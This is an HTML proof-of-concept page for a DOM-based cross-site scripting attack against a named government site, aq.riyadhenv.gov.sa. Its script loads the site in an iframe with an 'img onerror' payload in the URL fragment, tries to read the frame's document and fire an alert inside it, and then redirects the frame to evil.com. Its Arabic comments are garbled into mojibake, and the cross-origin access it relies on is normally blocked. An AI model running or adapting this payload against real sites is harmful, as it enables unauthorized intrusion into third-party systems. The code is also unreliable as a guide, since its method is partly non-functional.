<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Simulated DOM XSS â€“ aq.riyadhenv.gov.sa</title>
</head>
<body>
  <h3>ğŸš¨ Simulated DOM XSS PoC</h3>
  <p>ØªØ¬Ø±ÙŠ Ù…Ø­Ø§ÙƒØ§Ø© ØªÙ†ÙÙŠØ° ÙƒÙˆØ¯ Ø¯Ø§Ø®Ù„ ØµÙØ­Ø© <code>aq.riyadhenv.gov.sa</code>. Ø¥Ø°Ø§ ØªÙ… Ø¹Ø±Ø¶ alert Ù…Ù† Ø§Ù„Ø¯ÙˆÙ…ÙŠÙ†ØŒ ÙØ§Ù„Ù…ÙˆÙ‚Ø¹ Ù‚Ø§Ø¨Ù„ Ù„Ù„Ø§Ø³ØªØºÙ„Ø§Ù„.</p>

  <iframe id="exploitFrame" style="width:100%; height:400px; border:1px solid #ccc;"></iframe>

  <script>
    const iframe = document.getElementById("exploitFrame");

    // Ø§Ù„Ø®Ø·ÙˆØ© 1: ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¯Ø§Ø®Ù„ iframe
    iframe.src = "https://aq.riyadhenv.gov.sa/#q=<img src=x onerror=console.log('XSS Test')>";

    // Ø§Ù„Ø®Ø·ÙˆØ© 2: Ù…Ø­Ø§ÙˆÙ„Ø© Ø¥Ø¸Ù‡Ø§Ø± alert Ù…Ù† Ø¯Ø§Ø®Ù„ iframe
    setTimeout(() => {
      try {
        // Ù†Ø­Ø§ÙˆÙ„ ØªÙ†ÙÙŠØ° ÙƒÙˆØ¯ Ø¯Ø§Ø®Ù„ iframe â€” Ù…Ø­Ø§ÙƒØ§Ø© ØªÙ†ÙÙŠØ° Ø¯Ø§Ø®Ù„ÙŠ
        const win = iframe.contentWindow;
        const doc = win.document;

        const msg = `âœ… Executed Inside:\nDomain: ${win.location.hostname}\nTitle: ${doc.title}`;
        win.alert(msg);

        // Ø§Ù„Ø®Ø·ÙˆØ© 3: Ø¥Ø¹Ø§Ø¯Ø© ØªÙˆØ¬ÙŠÙ‡ Ø¥Ù† Ù†Ø¬Ø­
        setTimeout(() => {
          win.location = "https://evil.com";
        }, 3000);

      } catch (e) {
        console.warn("âŒ Cannot access iframe content due to SOP or CSP restrictions.");
      }
    }, 3000);
  </script>
</body>
</html>
